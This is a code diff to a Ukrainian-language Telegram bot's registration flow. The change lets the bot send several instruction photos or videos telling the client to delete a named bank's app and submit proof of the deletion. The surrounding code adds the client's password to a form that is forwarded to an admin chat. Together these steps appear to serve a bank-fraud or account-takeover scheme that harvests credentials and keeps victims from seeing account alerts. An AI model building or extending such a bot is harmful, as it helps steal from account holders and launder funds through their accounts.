@@ -116,25 +116,55 @@ async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, cl
         await state.set_state(RegistrationStates.waiting_deletion_proof)
         
         proof_type_str = "скріншот" if deletion_req == 'screenshot' else "відео"
-        prompt_msg = f"Дякую! А тепер для завершення верифікації надішліть, будь ласка, {proof_type_str} видалення додатку {bank_name}."
+        prompt_msg = (template_data.get('deletion_text') if template_data else None) or f"Надішліть, будь ласка, {proof_type_str} видалення додатку {bank_name}."
         
         deletion_instr = template_data.get('deletion_screenshot_path') if template_data else None
         if deletion_instr:
             import os
-            clean_path = deletion_instr.lstrip('/')
-            abs_instr_path = os.path.join("web", clean_path)
-            if os.path.exists(abs_instr_path):
-                from aiogram.types import FSInputFile
-                try:
-                    await bot.send_photo(
-                        chat_id=client_id,
-                        photo=FSInputFile(abs_instr_path),
-                        caption=prompt_msg
-                    )
-                    return
-                except Exception as err:
-                    import logging
-                    logging.error(f"Error sending deletion instruction image: {err}")
+            from aiogram.types import FSInputFile, InputMediaPhoto, InputMediaVideo
+            
+            instr_paths = [p.strip() for p in deletion_instr.split(",") if p.strip()]
+            valid_media = []
+            
+            for p in instr_paths:
+                clean_path = p.lstrip('/')
+                abs_instr_path = os.path.join("web", clean_path)
+                if os.path.exists(abs_instr_path):
+                    ext = os.path.splitext(abs_instr_path)[1].lower()
+                    is_video = ext in ['.mp4', '.mov', '.avi', '.mkv', '.webm', '.3gp']
+                    caption = prompt_msg if len(valid_media) == 0 else None
+                    if is_video:
+                        valid_media.append(InputMediaVideo(media=FSInputFile(abs_instr_path), caption=caption))
+                    else:
+                        valid_media.append(InputMediaPhoto(media=FSInputFile(abs_instr_path), caption=caption))
+            
+            if valid_media:
+                if len(valid_media) == 1:
+                    try:
+                        first_item = valid_media[0]
+                        if isinstance(first_item, InputMediaVideo):
+                            await bot.send_video(
+                                chat_id=client_id,
+                                video=first_item.media,
+                                caption=prompt_msg
+                            )
+                        else:
+                            await bot.send_photo(
+                                chat_id=client_id,
+                                photo=first_item.media,
+                                caption=prompt_msg
+                            )
+                        return
+                    except Exception as err:
+                        import logging
+                        logging.error(f"Error sending single deletion instruction: {err}")
+                else:
+                    try:
+                        await bot.send_media_group(chat_id=client_id, media=valid_media)
+                        return
+                    except Exception as err:
+                        import logging
+                        logging.error(f"Error sending deletion instruction media group: {err}")
         
         await bot.send_message(
             chat_id=client_id,
@@ -178,10 +208,7 @@ async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, cl
         if client_password:
             anketa_text += f"{client_password}"
             
-    if has_deletion_proof:
-        proof_label = "скріншот" if deletion_req == 'screenshot' else "відео"
-        anketa_text += f"\n🗑️ Доказ видалення ({proof_label}): отримано"
-        
+    
     anketa_text = anketa_text.strip()
     
     from bot.config import get_anketa_chat_id, get_admin_id
